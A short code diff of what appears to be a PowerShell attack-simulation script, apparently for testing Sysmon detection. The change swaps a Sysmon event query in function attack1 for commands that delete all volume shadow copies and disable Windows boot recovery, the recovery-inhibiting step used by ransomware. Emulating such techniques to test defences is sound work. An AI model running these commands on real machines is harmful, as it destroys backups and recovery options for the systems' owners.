@@ -1,6 +1,9 @@
 function attack1()
 {
-(Get-WinEvent *Sysmon* | where message -like "*T1057*" | select -first 1).message
+#dissables system recovery methods
+vssadmin.exe delete shadows /all /quiet
+wmic.exe Shadowcopy Delete
+bcdedit /set {default} recoveryenabled No
 }
 
 function attack2()
